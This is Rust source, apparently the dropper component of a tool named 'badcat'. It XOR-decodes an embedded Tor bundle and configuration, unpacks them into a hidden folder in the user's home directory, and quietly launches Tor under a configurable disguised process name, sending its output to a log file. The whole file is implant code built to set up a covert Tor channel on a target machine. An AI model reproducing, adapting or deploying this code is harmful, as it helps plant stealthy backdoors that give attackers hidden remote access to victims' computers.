mod config;
mod setting;

use std::{io, error};
use std::fs::File;
use std::path::{PathBuf};
use std::process::{Command, Stdio};

use badcat_lib::xor;

fn main() -> Result<(), Box<dyn error::Error>> {
    let setting: setting::Setting = load_settings();

    std::fs::create_dir_all(&setting.tor_dir)?;
    
    unbundle_tor(&setting)?;

    let torrc = &setting.tor_dir.join("config");
    unbundle_torrc(&torrc, &setting)?;

    start_tor_binary(&torrc, &setting)?;

    Ok(())
}

fn load_settings() -> setting::Setting {
    let key = String::from(config::ENC_KEY);
    let name = String::from(config::NAME);

    let tor_dir = xor::decode(
        &key,
        &String::from(config::ENC_TOR_DIR)
    ).unwrap_or_else(|_| {
        panic!("problem unserializing directory");
    });

    let torrc = xor::decode(
        &key,
        &String::from(config::ENC_TORRC)
    ).unwrap_or_else(|_| {
        panic!("problem unserializing rc");
    });

    setting::Setting {
        name,
        key,
        torrc,
        tor_dir: expand_user_dir(&tor_dir)
    }
}

fn unbundle_tor(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
    let bundle = config::ENC_TOR_BUNDLE;
    let bytes = xor::decode_bytes(&setting.key, &String::from(bundle))?;

    let mut ar = tar::Archive::new(io::Cursor::new(&bytes));
    ar.unpack(&setting.tor_dir.join("..").join(".."))?;
    Ok(())
}

fn unbundle_torrc(
    path: &PathBuf,
    setting: &setting::Setting
) -> Result<(), Box<dyn error::Error>> {
    let mut contents = setting.torrc.clone();

    contents = contents.replace(
        "@{DATA_DIR}",
        setting.tor_dir.to_str().unwrap()
    );

    contents = contents.replace(
        "@{CTRL_COOKIE}",
        setting.tor_dir.join("ctrl.cookie").to_str().unwrap()
    );

    contents = contents.replace(
        "@{CTRL_SOCKET}",
        setting.tor_dir.join("ctrl.socket").to_str().unwrap()
    );

    std::fs::write(&path, &contents)?;

    Ok(())
}

fn expand_user_dir(path: &String) -> PathBuf {
    let mut home_dir = match dirs::home_dir() {
        Some(d) => d,
        None => panic!("problem finding home user directory")
    };

    home_dir.push(PathBuf::from(path));
    home_dir
}

fn start_tor_binary(
    torrc: &PathBuf,
    setting: &setting::Setting
) -> Result<(), Box<dyn error::Error>> {
    let mut executable = setting.tor_dir.join(&setting.name);

    if cfg!(windows) {
        executable.set_extension("exe");
    }

    // Fix directory permission - linux build requires this
    if cfg!(unix) || cfg!(macos) {
        let status = Command::new("chmod")
            .args(["700", setting.tor_dir.to_str().unwrap()])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()?;

        if !status.success() {
            return Result::Err(
                String::from("problem setting app directory permision").into()
            );
        }
    }

    let log = setting.tor_dir.join("log.txt");

    let stdout: File = File::create(&log)?;
    let stderr: File = File::create(&log)?;

    Command::new(executable)
        .args(["-f", torrc.to_str().unwrap()])
        .stdin(Stdio::null())
        .stdout(stdout)
        .stderr(stderr)
        .spawn()?;

    Ok(())
}